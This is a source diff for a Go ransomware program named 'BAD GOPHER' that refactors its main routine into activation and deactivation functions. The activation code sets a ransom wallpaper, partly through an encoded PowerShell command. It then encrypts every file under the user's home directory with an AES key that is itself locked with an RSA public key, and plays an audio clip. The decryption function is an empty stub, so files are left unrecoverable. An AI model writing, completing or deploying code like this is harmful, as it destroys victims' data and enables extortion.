@@ -15,6 +15,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -22,8 +23,16 @@ import (
 	"strings"
 	"time"
 
+	"github.com/faiface/beep"
+	"github.com/faiface/beep/mp3"
+	"github.com/faiface/beep/speaker"
 	"github.com/reujab/wallpaper"
 )
+
+var magicBytes = []byte("BAD GOPHER\n")
+var currentTime = []byte(time.Now().UTC().String() + "\n")
+
+const suffix = ".gopher"
 
 // Compresses one or many files into a single zip archive file.
 // Param 1: file is a file to add to the zip.
@@ -133,33 +142,31 @@ func decryptFile(filename string, key []byte) []byte {
 	return decrypt(data, key)
 }
 
-func main() {
-	// TODO: Add command-line arguments for decryption to recover files
-	// Another idea: separate user-friendly binary for decrypting with easy to
-	// use CLI. Store in this binary with https://github.com/markbates/pkger and
-	// extract onto the user's desktop when done.
-
-	home, _ := os.UserHomeDir()
-	home = home + "/"
-
+// Malware activation routine
+func activate(home string, keyFilePath string) {
+	// Set wallpaper
+	// TODO: save old wallpaper so it can be restored
 	desktopBackgroundDec, _ := base64.StdEncoding.DecodeString(desktopBackground)
 	f, _ := os.Create(home + "BAD_GOPHER.jpg")
-	defer f.Close()
 	f.Write(desktopBackgroundDec)
+	f.Close()
+
+	// TODO: Separate encryption and decryption routines into two separate functions
+	// to clean up the code
 
 	err := wallpaper.SetFromFile(home + "BAD_GOPHER.jpg")
 	if err != nil {
 		fmt.Println(err)
 	}
 
+	// Special command for setting Windows wallpaper for <= Windows 7
+	// EncodedCommand MUST be in UTF-16 LE encoding when encoded with base64
 	if runtime.GOOS == "windows" {
 		cmd := exec.Command("powershell", "-EncodedCommand", wallpaperCmdString)
 		defer cmd.Start()
 		defer cmd.Wait()
 	}
 
-	magicBytes := []byte("BAD GOPHER\n")
-	currentTime := []byte(time.Now().UTC().String() + "\n")
 	// decryptPtr := flag.Bool("decrypt", false, "decrypt with given key")
 
 	// Generate the symmetric AES encryption key
@@ -174,22 +181,12 @@ func main() {
 	// Encrypt the symmetric key with the asymmetric public key
 	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)
 
-	keyFilePath := home + "/BAD_GOPHER.txt"
-
-	// Check if key file exists, if so exit program b/c already encrypted
-	if _, err := os.Stat(keyFilePath); err == nil {
-		fmt.Printf("Key file exists, exiting")
-		return
-	}
-
 	// Save the decryption key and other information to the disk
 	keyFile, _ := os.Create(keyFilePath)
 	keyFile.WriteString(hex.EncodeToString(ciphertext))
 	keyFile.Close()
 
 	fmt.Printf("Ciphertext: %s\n", hex.EncodeToString(ciphertext))
-
-	const suffix = ".gopher"
 
 	// Go through every file in the starting directory and encrypt it
 	filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
@@ -250,5 +247,54 @@ func main() {
 		return nil
 	})
 
-	fmt.Println("Finished")
+	// Play audio
+	audioDec, _ := base64.StdEncoding.DecodeString(audioData)
+
+	// Create io.ReadCloser to stream audio from memory rather than saving file
+	audioReadCloser := ioutil.NopCloser(bytes.NewReader(audioDec))
+	streamer, format, err := mp3.Decode(audioReadCloser)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer streamer.Close()
+
+	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))
+
+	done := make(chan bool)
+	speaker.Play(beep.Seq(streamer, beep.Callback(func() {
+		done <- true
+	})))
+
+	<-done
+}
+
+// Malware deactivation and decryption routine
+func deactivate(home string, keyFilePath string) {
+
+}
+
+func main() {
+	// TODO: Add command-line arguments for decryption to recover files
+	// Check if If Bad Gopher has already ran on the computer (seen just below).
+	// If so, program should operate in decryption mode.
+	// At least for Windows, dragging the decryption key file onto Bad_Gopher.exe
+	// should start decryption
+
+	home, _ := os.UserHomeDir()
+	home = home + "/"
+	keyFilePath := home + "BAD_GOPHER.txt"
+
+	// Check if key file exists, if not run the program
+	if _, err := os.Stat(keyFilePath); err != nil {
+		activate(home, keyFilePath)
+		return
+	}
+
+	// Start decryption if key file provided
+	if len(os.Args) > 1 && strings.Contains(strings.ToLower(os.Args[1]), "bad_gopher_decrypt") {
+		deactivate(home, keyFilePath)
+		return
+	}
+
+	fmt.Println("BAD GOPHER has already been activated. No decryption key was provided.")
 }
